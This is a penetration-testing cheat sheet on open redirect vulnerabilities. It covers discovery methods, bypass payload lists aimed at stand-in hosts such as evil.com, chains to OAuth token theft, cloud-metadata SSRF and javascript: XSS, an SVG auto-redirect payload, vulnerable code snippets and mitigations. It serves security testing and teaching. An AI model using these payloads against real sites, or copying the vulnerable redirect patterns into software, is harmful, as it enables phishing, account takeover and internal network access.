## Overview

Open Redirect vulnerabilities occur when a web application redirects users to a URL specified by user-controllable input without proper validation. Attackers can exploit this by crafting malicious URLs that redirect victims from a trusted domain to an attacker-controlled site. While often considered low severity, Open Redirects can be chained with other vulnerabilities (SSRF, XSS, OAuth token theft) to achieve critical impact.

---

## Where to Find Open Redirects

### Common Locations

- **Login/Logout flows** - Check `returnUrl`, `next`, `redirect` parameters
- **Registration pages** - After signup redirections
- **Password reset flows** - Post-reset redirect parameters
- **Language/Region switchers** - When changing site locale
- **OAuth/OIDC flows** - `redirect_uri` parameters
- **Email links** - Click tracking redirects
- **Payment flows** - Post-checkout redirections

### Discovery Techniques

**1. Profile Page Trick**

```
1. Register and login
2. Visit your profile: site.com/accounts/profile
3. Logout and clear cookies
4. Paste profile URL again
5. Site prompts login with redirect param:
   → site.com/login?next=accounts/profile
6. Test: site.com/login?next=https://evil.com
```

**2. Google Dorking**

```
site:target.com inurl:redirect
site:target.com inurl:return
site:target.com inurl:url=
site:target.com inurl:%2f
site:target.com inurl:http
```

**3. Archive Crawling**

```bash
# Gather historical URLs
cat domains.txt | gau --o urls.txt
# Or use: waybackurls / hakrawler / katana

# Filter redirect parameters
rg -NI "(url=|next=|redir=|redirect|dest=|return=)" urls.txt | sort -u > candidates.txt

# Test with OpenRedireX
cat candidates.txt | openredirex -p payloads.txt -k FUZZ -c 50 > results.txt
```

**4. JavaScript Analysis** Search for client-side redirect sinks:

- `window.location`
- `location.href`
- `location.assign()`
- `location.replace()`
- `top.location.href`

---

## Common Vulnerable Parameters

```
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
?returnTo={payload}
?return_to={payload}
?return={payload}
?continue={payload}
?return_path={payload}
?go={payload}
?goto={payload}
?view={payload}
?image_url={payload}
?checkout_url={payload}
?logout={payload}
?forward={payload}
?callback_url={payload}
?jump={payload}
?origin={payload}
?location={payload}
```

---

## Exploitation Methods

### Basic Test

```
/?redir=https://evil.com
```

### Step-by-Step Exploitation

**Step 1:** Identify redirect parameter

```bash
# Single URL test
curl -s -I "https://target.com/redirect?url=//evil.com" | grep -i "^Location:"
```

**Step 2:** Test basic payload

```
https://target.com/login?next=https://attacker.com
```

**Step 3:** Check encoding requirements

```
# Single encoding
?return=https%3A%2F%2Fevil.com

# Double encoding (for nested redirects)
?return=https%3A%2F%2Ftarget.com%2F%3Freturn%3Dhttps%253A%252F%252Fevil.com
```

**Step 4:** Leverage for higher impact

- **Token theft:** Capture OAuth tokens in URL fragments
- **SSRF bypass:** Use trusted domain redirect to access internal resources
- **XSS:** Try `javascript:` protocol (works with JS-based redirects)

---

## Bypass Techniques

### 1. Whitelisted Domain Bypass

```
/?redir=target.com.evil.com
/?redir=target.com@evil.com
/?redir=evil.com/target.com
/?redir=evil.com?target.com
```

### 2. Protocol Manipulation

```
/?redir=//evil.com
/?redir=https:evil.com
/?redir=\\evil.com
/?redir=\/\/evil.com
/?redir=/\/evil.com
```

### 3. Encoding Bypasses

```
/?redir=evil%E3%80%82com          # Unicode dot
/?redir=//evil%00.com             # Null byte
/?redir=//google%E3%80%82com
```

### 4. Userinfo Trick

```
/?redir=target.com@evil.com
/?redir=target.com%40evil.com
/?redir=https://trusted.tld@attacker.tld
```

### 5. Backslash Confusion

```
/?redir=https://trusted.tld\@evil.com
# Server validates backslash as path
# Browser normalizes to / and treats trusted.tld as userinfo
```

### 6. Parameter Pollution

```
/?next=target.com&next=evil.com
```

### 7. Fragment/Hash Bypass

```
/?redir=target.com%23evil.com
/?redir=target.com#@evil.com
```

### 8. CRLF Injection

```
/?redir=%0d%0aLocation:%20https://evil.com
/?redir=/%0d/evil.com
/?redir=/%0a/evil.com
```

### 9. Localhost/Internal Bypass

```
# Decimal IP
/?redir=2130706433

# Hex IP
/?redir=0x7f000001

# Octal IP
/?redir=017700000001

# IPv6
/?redir=[::1]
/?redir=[::ffff:127.0.0.1]

# Wildcard DNS
/?redir=127.0.0.1.sslip.io
/?redir=lvh.me
/?redir=localtest.me
```

### 10. Path Traversal

```
/?redir=target.com/hi/../../../evil.com
/?redir=/\\evil.com
/?redir=/..//evil.com
```

---

## Top 10 Modern Payloads

```
1. //evil.com
2. https://trusted.tld@evil.com
3. https://trusted.tld\@evil.com
4. \/\/evil.com
5. /\/evil.com
6. //evil%E3%80%82com
7. //evil%00.com
8. /%0d/evil.com
9. https://trusted.tld.evil.com
10. javascript://%250Aalert(document.domain)
```

---

## Higher Impact Chains

### 1. OAuth Token Theft

**Scenario:** OAuth redirect leaks authorization code/token

```
# Normal flow
https://target.com/oauth/authorize?redirect_uri=https://target.com/callback

# Exploit
https://target.com/oauth/authorize?redirect_uri=https://evil.com/steal
→ User authorizes → Token sent to evil.com → Account takeover
```

### 2. SSRF via Open Redirect

**Scenario:** SSRF filter only allows local URLs

```
# Blocked
/?url=https://169.254.169.254/metadata

# Bypass using open redirect
/?url=/redirect?goto=//169.254.169.254/metadata
→ Trusted local path → Redirects externally → SSRF
```

### 3. XSS via JavaScript Protocol

**Scenario:** JS-based redirect with no 302 status

```html
<script>
  top.location.href = userInput; // Vulnerable
</script>
```

**Exploit:**

```
/?next=javascript:alert(document.domain)
/?next=javascript://%250Aalert(1)
/?next=java%0d%0ascript%0d%0a:alert(0)
```

### 4. Referer Header Leak

**Scenario:** Redirect exposes tokens in Referer

```
# User visits with token
https://target.com/dashboard?token=SECRET123

# Clicks external link
https://target.com/redirect?url=https://evil.com
→ Referer: https://target.com/dashboard?token=SECRET123
```

### 5. SVG-Based Open Redirect

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg onload="window.location='https://evil.com'" xmlns="http://www.w3.org/2000/svg">
</svg>
```

Upload as profile picture/attachment → Auto-redirect on view

---

## Testing Tools

### Automated Scanners

```bash
# OpenRedireX - Fuzzer
git clone https://github.com/devanshbatham/OpenRedireX
./openredirex.py -u "https://target.com/?url=FUZZ" -p payloads.txt -k FUZZ -c 50

# Oralyzer
python3 oralyzer.py -u https://target.com/redir?url=

# One-liner with gf
echo "domain" | waybackurls | httpx -silent | gf redirect | anew
```

### Manual Testing

```bash
# Check for 30x redirects
curl -I "https://target.com/redirect?url=//evil.com" | grep "Location:"

# Follow redirects
curl -L "https://target.com/redirect?url=//evil.com"
```

### Payload Generator

- [Intigriti Redirector Tool](https://tools.intigriti.io/redirector/)

---

## Code Examples (Vulnerable)

### .NET

```csharp
response.redirect("~/login.aspx") // Safe
response.redirect(Request["returnUrl"]) // VULNERABLE
```

### Java

```java
response.sendRedirect(request.getParameter("url")); // VULNERABLE
```

### PHP

```php
<?php
header("Location: " . $_GET['redirect']); // VULNERABLE
exit;
?>
```

### JavaScript

```javascript
// VULNERABLE patterns
window.location = new URLSearchParams(location.search).get('next');
location.href = getUrlParam('redirect');
```

---

## Mitigation Strategies

### ✅ Whitelist Approach

```python
# Good
ALLOWED_DOMAINS = ['example.com', 'app.example.com']
redirect_url = request.GET.get('next')
parsed = urlparse(redirect_url)
if parsed.netloc in ALLOWED_DOMAINS:
    return redirect(redirect_url)
```

### ✅ Relative URLs Only

```python
# Only allow relative paths
if redirect_url.startswith('/') and not redirect_url.startswith('//'):
    return redirect(redirect_url)
```

### ✅ Token-Based Redirects

```python
# Generate signed token for valid redirects
redirect_token = generate_token(target_url)
# Validate token before redirecting
```

### ❌ Avoid Blacklists

```python
# BAD - Easily bypassed
if 'http' not in url:  # Bypassed with //evil.com
    return redirect(url)
```

---

## Quick Reference - Hunting Workflow

```
1. Recon
   → Dorking + Archive crawling (gau/waybackurls)
   → Grep redirect params: gf redirect

2. Identify
   → Profile page trick
   → Check login/logout flows
   → OAuth redirect_uri params

3. Test
   → Basic: ?next=https://evil.com
   → Check encoding needs
   → Try bypass payloads

4. Escalate
   → OAuth token theft
   → SSRF chaining
   → XSS with javascript:
   → Referer leak

5. Report
   → Impact: Low → Critical (if chained)
   → Proof: Video/Screenshot
   → Recommendation: Whitelist validation
```

---

## Resources

- [PayloadsAllTheThings - Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)
- [HackerOne Reports](https://hackerone.com/hacktivity?querystring=open%20redirect)
- [PortSwigger - DOM-based Open Redirect](https://portswigger.net/web-security/dom-based/open-redirection)
- [PentesterLand Cheatsheet](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)